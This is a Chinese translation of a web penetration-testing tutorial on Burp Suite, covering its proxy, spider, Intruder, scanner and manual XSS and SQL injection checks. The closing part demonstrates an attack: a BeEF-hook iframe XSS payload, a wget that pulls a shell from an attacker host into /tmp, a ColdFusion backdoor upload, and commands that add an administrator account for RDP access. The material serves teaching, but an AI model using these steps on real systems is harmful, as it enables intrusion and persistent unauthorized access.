@@ -1,0 +1,280 @@
+[i春秋作家:Passerby2](https://bbs.ichunqiu.com/thread-41965-1-1.html?from=beef)
+
+#
+
+## web应用测试综述:
+
+    
+    
+    Web应用漏洞给企业信息系统造成了很大的风险。许多web应用程序漏洞是由于web应用程序缺乏对输入的过滤。简而言之Web应用程序利用来自用户的某种形式的输入并且在应用程序中执行了这些信息为其提供内容或者从系统的其他部分获取数据。如果未正确过滤输入攻击者可以发送非标准输入来利用web应用程序。本文将重点讨论burpsuite并介绍如何利用它来评估web应用程序。
+
+Burpsuite综述
+
+> Burpsuit有许多功能包括但不限于
+
+  * Interception Proxy:旨在让用户控制发送到服务器的请求。
+  * Repeater:快速重复或修改指定请求的能力。
+  * Intruder:允许自动化自定义攻击和payload。
+  * Decoder:解码和编码不同格式的字符串URL,BASE64,HTML等等。
+  * Comparer: 高亮显示不同的请求或响应之间的不同处。
+  * Extender: 扩展Burp功能的API接口以及许多通过BApp商店免费提供的扩展。
+  * Spider and Discover Content feature:爬取web应用程序上的链接并且可以被用来动态枚举非显式链接的内容来寻找信息。
+  * Scanner (Pro Only): 检查web应用程序漏洞XSSSQLi代码注入文件包含等的自动扫描程序。 
+
+## 入门
+
+Burp的详细帮助文档在下面能找到
+
+[http://portswigger.net/burp/help/suite_gettingstarted.html](https://bbs.ichunqiu.com/thread-41965-1-1.html?from=beef)
+
+Burpsuite能通过java -jar命令行加载。你可以通过使用选项“-Xmx”分配你的burp所需内存。
+
+java -jar -Xmx1024m /path/to/burp.jar
+
+  
+![image.png](https://image.3001.net/images/20180627/15300840347834.png!small)  
+
+    
+    
+    像许多拦截代理一样Burp也是通过GUI驱动的但是有一些选项需要通过Extender功能利用命令行启动。
+
+一旦burpsuite启动建议你先在Scope定义好目标主机。你可以在site
+map控制显示的内容和其他功能。Scope能通过定义目标主机名IP或者网络范围:
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_2.png)  
+
+    
+    
+    Proxy选项卡显示Burp的代理详细信息、intercept选项和HTTP请求历史。在下面你可以看到“Intercept is on” 所以任何从浏览器发出的请求都将必须通过Burp的proxy手动点击forward才能进行
+
+  
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_3.png)
+
+    
+    
+    Intercept 功能会截断所有从浏览器发送出来的流量其他扩展如FoxyProxy能用来指定哪个URL和IP是黑名单或白名单这些名单能绕过burp的截断。
+    通过配置好Burp的scope和proxy你可以开始使用你的浏览器和burp浏览web应用程序了如你可以在Site Map目标右键弹出菜单选项。在这个视图中你可以看到web应用的目录结构和资源。通过右击URL或者资源你可以通过几个选项调用其他功能例如Burp的spider功能或者执行主动式扫描
+
+  
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_4.png)
+
+    
+    
+    便捷提示为了更容易专注于目标web应用程序你可以点击“Filter”菜单只显示仅仅在范围内的内容
+
+  
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_5.png)
+
+    
+    
+    激活Burp的spider功能将爬取web应用的链接默认爬取链接深度为5但是这些选项都是在“spider”选项卡中配置的。一旦你截断web应用程序所有的请求和响应都将在“proxy”选项卡中记录下来。你可以高亮显示一个请求让它脱颖而出并且可以在之后的分析中留下注释
+
+  
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_6.png)
+
+## Burp的Engagement Tools
+
+Burpsuite在它的Engagement Tools 右击目标站点的视图>Engagement Tools
+下他提供了大量有用的功能。从这你可以选择“Analysis
+Target”分析目标这个功能提供给你链接参数和静态、动态内容的计数。了解这些信息对评估目标非常有用。链接、参数、和动态内容越多注入fuzz的点就更多。  
+在下面的截图中你可以看到一些其他功能如“Schedule
+Task”定时任务让你可以定时进行主动扫描。如果客户端想在一天中的某几个小时执行自动化测试这个功能特别有用。
+
+  
+[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[](http://www.example.com)[链接文字](http://www.example.com)![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/engagement_tools.png)
+
+## Discovering Unlinked Content发现非显式链接内容
+
+进行web应用程序测试时将面临到的一个问题是枚举未使用显式链接的内容。这可能是一种很耗时的方式因为它主要依赖暴力猜解来制作请求并且查看服务器上是否存在该资源。举个例子“/tmp/”目录不是在web应用任何一个链接中但是如果发送请求/tmp/目录将得到响应。为了解决这个问题我们有许多其他的选择
+
+  * 利用Burp的Discover Content功能。
+  * 利用其它扫描器Niktow3afZAP等来探测一些默认资源。
+  * 利用DirBuster或Burp的Intruder功能基于一个固定列表暴力猜解资源。
+
+所有的这些方法都非常耗时并且实际上可能找不到任何东西因此根据测试时间和范围你可以不必让DirBuster
+运行一整天。一般情况下当你另外进行手工测试的时候它会自动在后台运行。  
+下面是一个例子调用Burp的Discover Content功能尝试动态枚举非显式链接的内容  
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_7.png)
+
+## Burp的Decoder和Comparer(编解码器和对比器)
+
+当你开始测试WEB应用程序时你将发现你经常需要将字符串解码或编码成不同格式。当尝试绕过一些简单的waf的时候非常有用。下面的例子是使用Burp的decoder执行URL编码除此之外还有别的编解码选项。
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_8.png)Burp的Comparer功能让你快速将请求或响应进行比较并且高亮显示它们之间的区别  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_9.png)
+
+## Burp的Extender扩展
+
+扩展功能提供了强大的API接口开发通过使用脚本语言开发额外的功能。许多扩展是用python编写并且通过Burp的应用商店免费提供使用。有个非常有用的扩展是Carbonator它允许你在命令行中实现brupspider>scan>report的全自动化。下面是应用商店一些可用扩展的截图
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_10.png)
+
+## Burp的Intruder暴力破解
+
+另一个选项是利用Burp的intruder功能它可以使用一个请求并且允许用户修改请求定义各种不同的payload注入点。一个常见的用例是迭代请求中的参数值用来查看web应用程序如何响应例如get
+/product.php?item=1你也许可以使用intruder检查比较一下1-1000响应的不同之处。你还可以将请求的资源作为要修改的位置。下面我们将通过遍历一个目录字典来演示这一点  
+1.指定一个请求并且选择“Send to
+Intruder”这将在“intruder”选项卡下弹出以下窗口。高亮显示区域是在请求中将使用“sniper”payload进行暴力猜解的那部分
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_11.png)2.接下来是payload选项卡你可以加载一个字典进行暴力猜解
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_12.png)
+
+3.选择“Intruder > Start
+Attack”开始攻击。接下来的结果窗口将显示创建的请求和HTTP状态码。正如我们所看到的我们能枚举出一部分spider未发现的其他资源  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_13.png)
+
+除了使用Burp建议在后台运行中间扫描程序用来检查一些默认配置和资源。下面是使用Nikto的例子也可以考虑其他扫描工具ZAPw3afGrendal等。正如我们所看到的Nikto发现了更多有趣的东西等待我们去调查如/tmp/和/test/:  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_14.png)
+
+在初步的侦察之后我们想开始一个主动式扫描这能让Burp测试已知内容以发现漏洞。主要通过Burp输入内容HTML、javascript、SQL语法、系统命令等进行大量的工作并且监测应用程序如何响应来实现。与任何Web应用程序漏洞扫描器一样Burp会报告一些需要手动验证的报告。要启动一个主动式扫描右击site
+map上的URL或者资源并选择“Actively scan this host”将会弹出下面主动扫描向导  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_15.png)
+
+在Web应用程序的扫描时间可能因Web应用程序而异。在某些情况下Web应用程序的自动扫描时间范围可能从几个小时到几天不等。扫描期间列举的链接计数是潜在的扫描持续时间的一个很好的指标。下面的窗口显示了1515个链接枚举但很少有参数用于测试输入。不带参数的链接将减少Burp对每个链接的请求次数因此扫描时间较短。  
+在评估主动扫描网络应用时另一个关键因素是表单提交。当你主动扫描web应用程序时根据web应用程序和向用户提供的功能你可能会生成大量日志故障单作业等。如果不在评估范围内应该密切监视这些情况以防止造成拒绝服务DoS情况。  
+扫描开始后可通过跳转到Burp中的“scanner”选项卡来查看结果和状态.  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_16.png)
+
+随着开始显示结果你可以开始检查一些结果。下面我们可以看到Burp提取多个爆出的结果以进一步调查  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_17.png)
+
+  
+
+## 分析扫描结果和手动测试
+
+验证Burp扫描结果确定是否是误报充分了解结果这通常会是一个好主意。从选择发现的结果开始选择如“Cross-site scripting
+(reflected)”然后选择并查看其请求和响应中影响漏洞评估的详细信息。检查XSS的第一件事就是在浏览器中重复这一个请求然后查看脚本是否运行了。你可以通过右击请求正文部分然后选择“Request
+in browser”
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_18.png)查看浏览器中的响应对确定标记是否正确非常有用。由于XSS评估结果与在客户端浏览器中执行的代码相关因此选择在依赖于扫描器逻辑之前手工验证发现结果非常重要。  
+Burp的另一个常用功能是“Repeater”通常用于验证结果或手动搜索其他结果。只需右键单击请求正文部分并选择“Send to Repeater”  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_19.png)
+
+在Repeater界面中你可以修改请求并快速重新发送请求给Web应用程序。  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_20.png)
+
+反射型XSS可以通过注入某种HTML / JavaScript的payload进行快速测试该payload解析无需输入进行验证。下面是修改XSS
+payload简单地“alert”XSS“”的示例  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_22.png)
+
+对于反射型XSS的实际应用你可能会利用iframe作为payload与鱼叉式网络钓鱼结合使用。下面是一个示例XSS
+payload你可以使用它来代替“alert”所以现在它可以加载客户端侧提供的exploit或BeEF挂钩的第三方资源  
+<iframe height=”0″ width=”0″src=<BeEF_hook></iframe>
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_21.png)
+
+BeEF是通过使用JavaScript来控制受害者浏览器的强大方法。在上面你可以看到使用XSS漏洞与BeEF相关的受害者浏览器。BeEF提供大量功能在受害者浏览器上执行甚至连接到Metasploit以进行攻击。  
+关于Web应用程序的安全性中XSS经常被许多人忽视因为你需要利用其他方法获取最终目标——shell。关于XSS的一点需要注意的是我们已经确定Web应用程序没有正确过滤用户输入并且这可能只是一个引出许多其他漏洞的迹象。  
+在下面这种情况我们通过发送到repeater并修改payload并在浏览器中显示响应来验证XSS并展示了如何利用XSS来控制受害者浏览器。Burp扫描结果另一个优点是修改发现结果所联系的风险等级。当分析扫描结果时你将毫无疑问遇见一些False
+Positive误报情况。因此Burp提供用户修改结果为“False Positive”的能力
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_23.png)
+
+Burp能够使用各种payload进行模糊输入但它确实会遗漏一些特定版本的漏洞和配置问题。这对任何工具都很常见因此建议你执行手动测试来验证工具找到的结果并列举Web应用程序中的其他漏洞。
+
+手动测试的第一步是获取Web应用程序使用的技术。特定的软件和版本信息可能会导致你获取额外的信息以获取可能存在的漏洞或漏洞。Whatweb是一款非常棒的工具能够让你快速了解Web应用程序所使用的技术。下面我们可以看到whatweb的命令行语法和输出
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i2.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_24.png)
+
+此时我们可能已经在运行完整的Burp扫描之前运行了whatweb但是我们可以从whatweb的输出中看到一些非常有趣的信息。  
+在这种情况下我们看到一个ColdFusion
+Web应用程序它给我们提供了手工测试的一个入手点。现在已经枚举出了ColdFusion检查是否存在管理资源如“/ CFIDE / administrator
+/”以便判断是否合乎ColdFusion应用的逻辑。
+
+## 手工测试
+
+Burp也可以成为在Web应用程序上执行手工测试的好工具。通常这种类型的测试是通过安全评估来进行的并且随着从各种扫描中发现更多信息可以进一步利用手动测试来利用它。关于手工测试的主题可以讲好几本书本博文将重点介绍一些非常基础的内容。当你开始浏览Web应用程序并查看工具输出时请问你自己以下问题  
+1.列举并研究所有可能存在的软件版本。ColdFusionWordPressSharePoint等。
+
+>   * 研究所有软件版本以检查是否存在已知的漏洞和常见的错误配置
+>   * 尝试请求与正在使用的技术相关的其他资源这些资源可能不会被Web应用程序显式链接出来。
+>
+
+2.Web应用程序是否用到了用户输入
+
+>   * 查看修改参数值HTTP头字段cookie等以查看Web应用程序的响应方式。
+>
+
+3.如果你怀疑某个部分的请求出现在屏幕上请测试XSS。因此如果你浏览该页面并注意到你的User-Agent可以直接看见请尝试用一些HTML /
+JavaScript替换你的User-Agent以测试XSS`<script> alert1</ script>`。
+
+4.你的请求是否被利用来针对数据库执行查询例如如果你注意到一个名为“id”的参数并且看到它带有一个数字值请尝试放置一个单引号“或双引号”以尝试生成数据库错误。这种类型的测试可以识别SQL注入的存在。
+
+5.Web应用程序是否利用任何输入来执行命令尝试修改输入以将附加命令附加到请求并查看它是否被Web应用程序成功处理。
+
+## 获取一个shell
+
+Webshell有各种文件格式和功能。你可能能够登陆一个php shellraw shellmeterpreter等一个原始的netcat
+shell.asp shell.jsp等等。可以使用的shell类型取决于web应用程序所使用的技术和配置。例如如果你获得了对Apache Tomcat
+GUI的访问权限则可以部署WAR后门。如果你在运行IIS时遇到一些RFI漏洞你可以尝试上传一个asp shell。
+
+当你获得一个shell的时候你也可以使用Web应用程序服务帐户的权限来运行它可能无法在当前工作目录中执行命令。由于这些原因你可能需要将Web
+Shell放置在/ tmp /目录`wget -O /tmp/shell.py http// <yourIp>
+/shell.py`中。关于远程命令执行RCE它一般需要在请求结束时有一个空字节00。
+
+有时候配置错误会导致可以上传一个web
+shell。下面我们可以看到我们可以访问ColdFusion管理界面。如果我们跳转到这里这实际上允许我们安排任务并上传.cfm后门。这是一个重要的发现但许多自动化扫描工具完全错过了  
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_25.png)
+
+  
+这个例子不太可能发生在现实世界中但重点是列举Web应用程序利用的软件版本然后进行研究以发现任何漏洞。ColdFusion伴随着许多目录遍历和越权漏洞已经成熟了。利用谷歌搜索和检查exploit-db等攻击研究资源在这个测试阶段可能会有很长的路要走。  
+由于我们可以访问管理界面因此下一个合理的步骤就是安排一个任务来调用.cfm后门并将其发布到Web应用程序中。要在ColdFusion中安排任务它位于“Debugging&Logging”菜单下  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_26.png)
+
+接下来你需要在另一个地方快速搭起一个WEB服务器以允许WEB应用程序将后门下载下来。我发现利用Python来快速建立一个Web服务器是非常有用的  
+python -m SimpleHTTPServer 80  
+然后我们可以配置并运行计划任务来撤消并发布后门。你需要确保选中“publish”复选框并且可以从左侧的服务器设置摘要中枚举文件系统目录结构  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_27.png)
+
+在我们运行计划任务后你可以监控你的Python Web服务器以查看受害者服务器请求后门。然后你可以跳转到Web应用上的后门进行交互以在其OS上执行命令  
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_28.png)我们可以执行一个“whoami”命令来查看Web应用程序有什么权限
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i1.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_29.png)
+
+作为“nt authority\system”执行,意味着我们可以开始进行一些修改如添加用户并关闭防火墙。我们将使用以下命令添加一个用户
+
+> net user jobin password /ADD  
+> net user localgroup Administrators jobin /ADD  
+> net localgroup “Remote Desktop Users” jobin /ADD
+
+现在禁用防火墙并通过.cfmshell添加用户我们可以通过RDP协议连接受害者系统以获得终端访问权限
+
+![æ­¤å¤è¾å¥å¾ççæè¿°](https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/05/b_30.png)
+
+  
+
+## 总结
+
+Web应用程序漏洞的常见来源是缺少对用户输入的过滤。Web应用程序扫描工具的工作原理是通过发出包含后面代码、缺少过滤的输入请求来利用的Web代码语法本地/远程资源等。  
+Web应用程序测试是一个非常高级的主题本博文仅关注一些基本知识Burp Suite简介。如果你想了解有关Web应用程序测试的更多信息请查看以下资源
+
+  * Metasploitable可以为Web应用程序提供很好的实践
+  * SecureIdeas提供便宜的Burp网络训练研讨会
+  * OWASP
+  * 通过访问[www.pentesterlab.com](https://bbs.ichunqiu.com/thread-41965-1-1.html?from=beef)获取免费培训和实验室
+  * SANS 542和642 Web应用[渗透测试](http://bbs.ichunqiu.com/portal.php?from=beef)课程
+  * 攻击性[安全培训](http://www.ichunqiu.com?from=beef)OSCP有很多网络应用程序测试
+
+作者primalsecurity  
+翻译i春秋翻译小组-海绵体VS括约肌  
+责任编辑jishuzhain  
+翻译来源<http://www.primalsecurity.net/0x2-exploit-tutorial-web-hacking-with-burp-suite/>
+
+### 有问题大家可以留言哦也欢迎大家到春秋论坛中来耍一耍
+[>>>点击跳转](https://bbs.ichunqiu.com/portal.php?from=beef)
+
+  
+
